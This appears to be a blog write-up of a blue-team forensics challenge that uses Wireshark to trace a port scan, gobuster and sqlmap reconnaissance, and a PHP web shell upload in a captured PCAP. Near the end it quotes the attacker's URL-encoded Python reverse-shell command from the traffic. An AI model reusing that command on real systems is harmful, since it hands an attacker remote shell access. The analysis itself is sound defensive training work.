---
title: Network Analysis - Web Shell
date: 2023-05-29
image: 
  path: https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Wireshark_icon.svg/1200px-Wireshark_icon.svg.png
categories: [Write-Ups, BTLO, Challenges]
tags: [BTLO, DFIR, webshell, wireshark]
---

## Scenario
The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

`Wireshark`{:.info} `Tshark`{:.info} `TCPDump`{:.info}

Before starting this challenge I suggest to study network protocols, how to make network analysis and how the web works.

## Challenge Submission

### What is the IP responsible for conducting the port scan activity?
To complete this challenge I used [Wireshark](https://www.wireshark.org/){:target="_blank"}. I feel absolutely confident with this tool.
The goal is to analyse network traffic in order to answer challenge's questions.
First of all I opened pcap file and checked for *Endpoint Statistics*.
Curious thing is that only two endpoints have lot of bytes transmitted and received, so I filtered for these two IPs.

![Alt text](/assets/img/net-analysis-web-shell/1.png)

It was simple to understand which endpoint generated traffic in order to perform a "Local to Local Port Scanning".

>10.251.96.4

### What is the port range scanned by the suspicious host?
To solve this question I applied the following query:
```wireshark
ip.src==10.251.96.4 && ip.dst==10.251.96.5
```
and then I ordered *Dest. Port.* column in ascending and I looked for this kind of info packet:
```
673	2021-02-07 16:33:06.260189996	10.251.96.4	10.251.96.5	81	TCP	62	41675 → 81 [SYN] Seq=0 Win=1024 Len=0 MSS=1460
```

>81-1024

### What is the type of port scan conducted?
In this type of Port Scanning, there are two important messages between hosts.
First host: *SYN*
Second host: *RST, ACK* or *SYN/ACK*
This is a specific Port Scanning technique: **TCP SYNScan**.
You can read more [here](https://iphelix.medium.com/port-scanning-techniques-7661839d182e){:target="_blank"} about Port Scanning's Techniques.
[Here](https://www.howtouselinux.com/post/tcp-flags){:target="_blank"} you can read more about packet TCP Flags.

 - This is a good query cheat sheet for [Detection network attacks with Wireshark](https://www.infosecmatter.com/detecting-network-attacks-with-wireshark/){:target="_blank"}

>TCP SYN

### Two more tools were used to perform reconnaissance against open ports, what were they?
Once we understand which hosts are interested we can filter by destination IP and Port.
```wireshark
(tcp.dstport == 80) && (ip.dst == 10.251.96.5)
```
Following various HTTP packets I noticed several GET Requests. 
Inside the packet we can note *User-Agent* field that was filled by a particular tool.
In this case **gobuster 3.0.1** a web directory enumeration tool.

I updated my query for the detection:
```wireshark
(tcp.dstport == 80) && (ip.dst == 10.251.96.5) && (http.user_agent)
```

Tools are two in according with the question. So I deleted gobuster rows to discover other details.
```wireshark
((tcp.dstport == 80) && (ip.dst == 10.251.96.5) && (http.user_agent)) && !(http.user_agent == "gobuster/3.0.1")
```

I noticed POST Requests and, investigating the packet, I discovered the second tool: **sqlmap 1.4.7** used to perform reconnaissance.

> gobuster 3.0.1, sqlmap 1.4.7

### What is the name of the php file through which the attacker uploaded a web shell?
The attacker uploaded a web shell so in this case we have to investigate filtering for POST Request because he's uploading something on the website.
```wireshark
(tcp.dstport == 80) && (ip.dst == 10.251.96.5) && http.request.method==POST
```

Last row of the result show us the name of the file through which the attacker uploaded the webshell.

![Alt text](/assets/img/net-analysis-web-shell/2.png)

>editprofile.php

### What is the name of the web shell that the attacker uploaded?
Following the TCP Stream we can see clearly the POST Request and the filename of the webshell.

![Alt text](/assets/img/net-analysis-web-shell/3.png)

>dbfunctions.php

### What is the parameter used in the web shell for executing commands?
Looking at the php code of the web shell we can see the parameter used.

>cmd

### What is the first command executed by the attacker?
We can use the following query to detect GET Requests after the upload of the web shell:
```wireshark
ip.src==10.251.96.4 && http.request.method == "GET"
```

![Alt text](/assets/img/net-analysis-web-shell/4.png)

>id

### What is the type of shell connection the attacker obtains through command execution?
Last command launched is a python reverse shell.
```wireshark
GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

>reverse shell

### What is the port he uses for the shell connection?
You can see the port used for the shell connection in the python command.

>4422

